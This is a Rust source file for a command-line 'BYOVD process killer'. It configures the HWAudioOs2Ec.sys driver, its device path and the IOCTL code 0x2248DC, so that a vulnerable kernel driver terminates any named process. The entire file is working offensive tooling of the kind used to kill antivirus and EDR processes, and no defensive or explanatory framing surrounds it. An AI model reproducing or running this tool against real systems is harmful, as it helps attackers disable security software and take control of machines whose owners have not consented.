use byovd_lib::{DriverConfig, Result};
use clap::Parser;

// ============================================================================
// Driver Configuration - HWAudioOs2Ec
// ============================================================================

struct HWAudioOs2Ec;
impl DriverConfig for HWAudioOs2Ec {
    fn driver_name(&self) -> &str {
        "HWAudioOs2Ec"
    }

    fn driver_file(&self) -> &str {
        "HWAudioOs2Ec.sys"
    }

    fn device_path(&self) -> &str {
        "\\\\.\\HWAudioX64"
    }

    fn ioctl_code(&self) -> u32 {
        0x2248DC
    }

    fn build_ioctl_input(&self, pid: u32, _process_name: &str) -> Vec<u8> {
        pid.to_ne_bytes().to_vec()
    }

    fn ioctl_output_size(&self) -> usize {
        4
    }
}

// ============================================================================
// CLI
// ============================================================================

#[derive(Parser)]
#[command(name = "HWAudioOs2Ec-Killer", version, author = "BlackSnufkin, wwwab")]
#[command(about = "BYOVD process killer using HWAudioOs2Ec driver")]
struct Cli {
    /// Target process name (e.g., notepad.exe)
    #[arg(short = 'n', long = "name", required = true)]
    process_name: String,
}

// ============================================================================
// Main
// ============================================================================

fn main() -> Result<()> {
    let cli = Cli::parse();
    byovd_lib::run(&HWAudioOs2Ec, &cli.process_name, None)
}
